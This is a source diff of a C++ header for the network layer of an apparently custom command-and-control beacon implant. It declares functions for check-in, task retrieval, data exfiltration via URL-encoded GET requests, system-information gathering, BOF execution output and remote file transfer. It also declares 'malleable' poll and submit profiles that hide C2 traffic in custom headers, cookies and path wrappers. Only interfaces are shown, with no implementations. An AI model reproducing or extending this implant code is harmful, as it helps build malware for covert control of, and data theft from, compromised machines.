@@ -3,9 +3,7 @@
 #include <stddef.h>
 #include <utility>
 #include "../resolver.h"
-
-// Forward declaration (defined in config_parser.h)
-struct PCFG_ChannelMalleable;
+#include "../config_parser.h"
 
 // -- Option flags for sendData ------------------------------------------
 
@@ -18,7 +16,7 @@ namespace pandragon {
 }
 
 
-bool initNetworkTable(functionTable* ntFt);
+[[nodiscard]] bool initNetworkTable(functionTable* ntFt);
 
 // Set channel security mode (true=HTTPS, false=HTTP)
 // Default is HTTPS (backward compatibility)
@@ -31,16 +29,11 @@ bool isChannelSecure(void);
 // Set to false for self-signed certs in testing
 void setValidateSSL(bool validate);
 
-// Set HTTP method for data transmission (0=GET, 1=POST)
-void setHttpMethod(uint8_t method);
-
-// Get current HTTP method
-uint8_t getHttpMethod(void);
-
 // Call once at startup before any send/get.
 void initNetwork(functionTable* ntFt,
                  const wchar_t*   host,
-                 const wchar_t*   checkInPath,
+                 const wchar_t*   pollPath,
+                 const wchar_t*   submitPath,
                  const wchar_t* userAgent,
                  uint16_t         port);  // Server port (use 0 for default: 443 for HTTPS, 80 for HTTP)
 
@@ -51,77 +44,112 @@ void setBeaconIdentity(const uint8_t* beaconID, const uint8_t* cryptoKey);
 bool isKeyRotationPending(void);
 void clearKeyRotationPending(void);
 
-// Set malleable network configuration from parsed BeaconConfig struct
+// Set malleable configuration from parsed BeaconConfig struct
 // (call after setBeaconIdentity)
-// Accepts a pointer to either a BeaconConfig (global) or PCFG_ChannelMalleable (per-channel)
-// Uses has_malleable_config field in BeaconConfig to determine if malleable is present
 void setMalleableConfigFromBeaconConfig(const void* beaconConfig);
 
 // Clear all malleable config state (for TCP channels or bare channels)
 void clearMalleableConfig(void);
 
-// Set malleable config from a per-channel PCFG_ChannelMalleable
-void setMalleableFromChannelMalleable(const PCFG_ChannelMalleable* chMalleable);
+// Set poll/submit malleable from a per-channel PCFG_ChannelMalleable
+void setPollMalleableFromChannelMalleable(const PCFG_ChannelMalleable* chMalleable);
+void setSubmitMalleableFromChannelMalleable(const PCFG_ChannelMalleable* chMalleable);
+
+// Resolve poll/submit malleable from BeaconConfig (per-channel with global fallback)
+void setPollMalleableFromBeaconConfig(const void* beaconConfig, uint8_t channelIndex);
+void setSubmitMalleableFromBeaconConfig(const void* beaconConfig, uint8_t channelIndex);
+
+// Set poll/submit response malleable from BeaconConfig (per-channel with global fallback)
+void setPollResponseFromBeaconConfig(const void* beaconConfig, uint8_t channelIndex);
+void setSubmitResponseFromBeaconConfig(const void* beaconConfig, uint8_t channelIndex);
+
+// Request direction (for transport to select poll vs submit malleable headers)
+enum class RequestDirection : uint8_t {
+    POLL,
+    SUBMIT
+};
+void setRequestDirection(RequestDirection dir);
+RequestDirection getRequestDirection(void);
 
 // Set active C2 channel: switches host/path/ua/port and resolves malleable config
-// channelIndex: which channel in the config (0..channel_count-1)
-// config: pointer to parsed BeaconConfig (must have channels + channel_malleable populated)
 void setActiveChannel(uint8_t channelIndex, const void* config);
 
-// Get wrapper prefix (returns empty string if not configured)
-const char* getWrapperPrefix(void);
+// --- POLL-direction getters -----------------------------------------------
+bool isPollSet(void);
+const char* getPollWrapperPrefix(void);
+const char* getPollWrapperSuffix(void);
+const char* getPollCustomHTTPHeader(uint8_t index, uint16_t* name_len, uint16_t* value_len);
+const char* getPollCustomHeaderValue(uint8_t index);
+uint8_t getPollCustomHTTPHeaderCount(void);
+PCFG_LOCATION_TYPE getPollPayloadLocationType(void);
+const char* getPollPayloadParamName(void);
+const char* getPollCookieName(void);
+uint8_t getPollCookieNameLen(void);
+const char* getPollPathPrefix(void);
+const char* getPollPathSuffix(void);
 
-// Get wrapper suffix (returns empty string if not configured)
-const char* getWrapperSuffix(void);
+// --- SUBMIT-direction getters ---------------------------------------------
+bool isSubmitSet(void);
+const char* getSubmitWrapperPrefix(void);
+const char* getSubmitWrapperSuffix(void);
+const char* getSubmitCustomHTTPHeader(uint8_t index, uint16_t* name_len, uint16_t* value_len);
+const char* getSubmitCustomHeaderValue(uint8_t index);
+uint8_t getSubmitCustomHTTPHeaderCount(void);
+PCFG_LOCATION_TYPE getSubmitPayloadLocationType(void);
+const char* getSubmitPayloadParamName(void);
+const char* getSubmitCookieName(void);
+uint8_t getSubmitCookieNameLen(void);
+const char* getSubmitPathPrefix(void);
+const char* getSubmitPathSuffix(void);
 
-// Get custom HTTP header by index (returns NULL if index out of range)
-// Returns header name; use getCustomHeaderValue() to get the value
-const char* getCustomHTTPHeader(uint8_t index, uint16_t* name_len, uint16_t* value_len);
+// --- POLL-response (S2B) getters ------------------------------------------
+bool isPollResponseSet(void);
+const char* getPollResponseWrapperPrefix(void);
+const char* getPollResponseWrapperSuffix(void);
+const char* getPollResponseCookieName(void);
 
-// Get custom HTTP header value by index
-const char* getCustomHeaderValue(uint8_t index);
+// --- SUBMIT-response (S2B) getters ----------------------------------------
+bool isSubmitResponseSet(void);
+const char* getSubmitResponseWrapperPrefix(void);
+const char* getSubmitResponseWrapperSuffix(void);
+const char* getSubmitResponseCookieName(void);
 
-// Get number of custom HTTP headers
-uint8_t getCustomHTTPHeaderCount(void);
+// URL-safe base64 encoder/decoder (RFC 4648, no padding)
+// '+' -> '-', '/' -> '_', trailing '=' stripped.
+// Returns heap-alloc'd null-terminated string; caller must __free().
+char* b64UrlEncode(const unsigned char* src, size_t srcLen);
+unsigned char* b64UrlDecode(const char* src, size_t srcLen, size_t* outLen);
 
-// Get payload location type (0=query_param, 1=path, 2=body)
-uint8_t getPayloadLocationType(void);
-
-// Get query parameter name for payload location
-const char* getPayloadParamName(void);
-
-// Get path prefix for path location mode
-const char* getPathPrefix(void);
-
-// Get path suffix for path location mode
-const char* getPathSuffix(void);
+// Unwrap poll server response by stripping S2B wrapper prefix/suffix
+// Returns pointer into the original buffer (caller must NOT free)
+const char* unwrapPollResponseBuffer(const char* rawResponse, size_t rawLen, size_t* outLen);
 
 // Switch to a different C2 channel (for failover)
 // Returns true on success, false on allocation failure
-bool switchChannel(const wchar_t* host, const wchar_t* path, const wchar_t* userAgent, uint16_t port, uint8_t http_method = 0);
+[[nodiscard]] bool switchChannel(const wchar_t* host, const wchar_t* pollPath, const wchar_t* submitPath, const wchar_t* userAgent, uint16_t port);
 
 // Send initial check-in packet with BEACON_CHECK_IN opcode
 // Returns true on successful transmission
-bool sendCheckin(const char* sysinfo = nullptr, size_t sysinfo_len = 0);
+[[nodiscard]] bool sendCheckin(const char* sysinfo = nullptr, size_t sysinfo_len = 0);
 
 // Gather system information into a binary payload (caller must __free)
 // Returns allocated buffer, sets out_len to buffer size
-char* gatherSystemInfo(size_t* out_len);
+[[nodiscard]] char* gatherSystemInfo(size_t* out_len);
 
 // POST content to C2. Returns true on non-null response.
 // Flags control future encrypt/compress pipeline stages.
-bool sendData(const char* content, uint32_t flags = static_cast<uint32_t>(pandragon::networkFlags::NETWORK_NO_ENCRYPT));
+[[nodiscard]] bool sendData(const char* content, uint32_t flags = static_cast<uint32_t>(pandragon::networkFlags::NETWORK_NO_ENCRYPT));
 
 
-bool sendData(const void* content, size_t contentLen,
+[[nodiscard]] bool sendData(const void* content, size_t contentLen,
               uint32_t flags = static_cast<uint32_t>(pandragon::networkFlags::NETWORK_NO_ENCRYPT));
 
 // GET next task from C2. Caller must __free() pair.first.
-std::pair<void*, size_t> getMessage();
+[[nodiscard]] std::pair<void*, size_t> getMessage();
 
 // GET /<targetPath>?<urlsafe_base64(content[0..contentLen])>
 // contentLen is explicit so binary blobs work too.
-bool sendExfil(const void*    content,
+[[nodiscard]] bool sendExfil(const void*    content,
                size_t         contentLen,
                const wchar_t* targetPath); 
 
@@ -237,6 +265,10 @@ namespace pandragon {
 
     constexpr size_t MAC_LEN    = 16;
     constexpr size_t HEADER_LEN = sizeof(packet_header);
+
+    // -- Low-level parse (no malloc, no decrypt) ------------------------------
+    parse_err parsePacket(const uint8_t* buf, size_t buf_len,
+                          bool direction_s2b, parsed_packet& out);
 
     // -- Packet serialization/deserialization functions -----------------------
     std::pair<parse_err, std::pair<uint8_t*, size_t>> serializePacket(
@@ -381,6 +413,23 @@ namespace pandragon {
     };
 
     #pragma pack(pop)
+
+    static_assert(sizeof(packet_header) == 46, "packet_header must be 46 bytes (no padding)");
+    static_assert(sizeof(payload_sleep) == 8, "payload_sleep must be 8 bytes (unpacked)");
+    static_assert(sizeof(payload_bof_exec) == 6, "payload_bof_exec must be 6 bytes");
+    static_assert(sizeof(payload_file_download) == 2, "payload_file_download prefix must be 2 bytes");
+    static_assert(sizeof(payload_file_upload) == 6, "payload_file_upload prefix must be 6 bytes");
+    static_assert(sizeof(payload_file_content) == 7, "payload_file_content prefix must be 7 bytes");
+    static_assert(sizeof(payload_file_write_result) == 1, "payload_file_write_result must be 1 byte");
+    static_assert(sizeof(payload_rotate_key) == 40, "payload_rotate_key must be 40 bytes");
+    static_assert(sizeof(payload_key_rotate_ack) == 4, "payload_key_rotate_ack must be 4 bytes");
+    static_assert(sizeof(payload_file_download_start) == 6, "payload_file_download_start prefix must be 6 bytes");
+    static_assert(sizeof(payload_file_download_ack) == 5, "payload_file_download_ack must be 5 bytes");
+    static_assert(sizeof(payload_file_download_chunk) == 12, "payload_file_download_chunk must be 12 bytes");
+    static_assert(sizeof(payload_file_chunk_data) == 13, "payload_file_chunk_data prefix must be 13 bytes");
+    static_assert(sizeof(payload_file_upload_start) == 10, "payload_file_upload_start prefix must be 10 bytes");
+    static_assert(sizeof(payload_file_upload_chunk) == 13, "payload_file_upload_chunk prefix must be 13 bytes");
+    static_assert(sizeof(payload_file_upload_ack) == 5, "payload_file_upload_ack must be 5 bytes");
     
     // =============================================================================
     // File Transfer Helper Functions
@@ -394,14 +443,14 @@ namespace pandragon {
      * @param status        0=success, 1=error
      * @return true on successful transmission
      */
-    bool sendFileContent(const wchar_t* filePath, const uint8_t* fileData, size_t fileSize, uint8_t status);
+    [[nodiscard]] bool sendFileContent(const wchar_t* filePath, const uint8_t* fileData, size_t fileSize, uint8_t status);
     
     /**
      * Send file write result to server (FILE_WRITE_RESULT opcode - legacy)
      * @param status  0=success, 1=error
      * @return true on successful transmission
      */
-    bool sendFileWriteResult(uint8_t status);
+    [[nodiscard]] bool sendFileWriteResult(uint8_t status);
     
     // Chunked file transfer functions
     
@@ -411,7 +460,7 @@ namespace pandragon {
      * @param status    0=OK (file exists), 1=ERROR
      * @return true on successful transmission
      */
-    bool sendFileDownloadAck(uint32_t fileSize, uint8_t status);
+    [[nodiscard]] bool sendFileDownloadAck(uint32_t fileSize, uint8_t status);
     
     /**
      * Send file chunk data (FILE_CHUNK_DATA opcode)
@@ -422,7 +471,7 @@ namespace pandragon {
      * @param data        Pointer to chunk data (NULL if status=ERROR)
      * @return true on successful transmission
      */
-    bool sendFileChunkData(uint32_t chunkIndex, uint32_t offset, uint32_t chunkSize, uint8_t status, const uint8_t* data);
+    [[nodiscard]] bool sendFileChunkData(uint32_t chunkIndex, uint32_t offset, uint32_t chunkSize, uint8_t status, const uint8_t* data);
     
     /**
      * Send file upload acknowledgment (FILE_UPLOAD_ACK opcode)
@@ -430,7 +479,7 @@ namespace pandragon {
      * @param status      0=OK (written), 1=ERROR (write failed)
      * @return true on successful transmission
      */
-    bool sendFileUploadAck(uint32_t chunkIndex, uint8_t status);
+    [[nodiscard]] bool sendFileUploadAck(uint32_t chunkIndex, uint8_t status);
 
     /**
      * Send directory listing result to server (LIST_FILES_RESULT opcode)
@@ -440,14 +489,14 @@ namespace pandragon {
      * @param errorMsg    Error message string (wchar_t, only if status=1)
      * @return true on successful transmission
      */
-    bool sendListFilesResult(const void* entries, uint32_t entryCount, uint8_t status, const wchar_t* errorMsg = nullptr);
+    [[nodiscard]] bool sendListFilesResult(const void* entries, uint32_t entryCount, uint8_t status, const wchar_t* errorMsg = nullptr);
 
     /**
      * Send key rotation acknowledgment (KEY_ROTATE_ACK opcode)
      * @param status  0=OK (key accepted), 1=ERROR (invalid beacon ID)
      * @return true on successful transmission
      */
-    bool sendKeyRotateAck(uint8_t status);
+    [[nodiscard]] bool sendKeyRotateAck(uint8_t status);
 
     /**
      * Send BOF output to server (BOF_OUTPUT opcode)
@@ -456,7 +505,7 @@ namespace pandragon {
      * @param task_id   Task ID for output correlation
      * @return true on successful transmission
      */
-    bool sendBofOutput(const char* output, size_t len, uint32_t task_id);
+    [[nodiscard]] bool sendBofOutput(const char* output, size_t len, uint32_t task_id);
 
 
 } // namespace pandragon
